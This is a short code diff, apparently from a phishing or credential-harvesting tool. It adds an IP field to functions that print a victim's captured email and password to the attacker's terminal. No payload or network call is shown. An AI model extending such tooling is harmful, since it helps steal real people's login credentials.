@@ -86,12 +86,23 @@ def localhost_run():
   
   return False
 
-def show_data(email, password):
+def show_data(email, password, ip):
   print(f"""
             \033[0;38;5;112m************************ Data ************************
             
             \033[0m      Email: {email}
             \033[0m      Pass:  {password}
+
+            \033[0;38;5;112m******************************************************\033[0m 
+        """)
+
+def show_data_test(email, password, ip):
+  print(f"""
+            \033[0;38;5;112m************************ Data ************************
+            
+            \033[0m      Email: {email}
+            \033[0m      Pass:  {password}
+            \033[0m      IP: {ip}
 
             \033[0;38;5;112m******************************************************\033[0m 
         """)
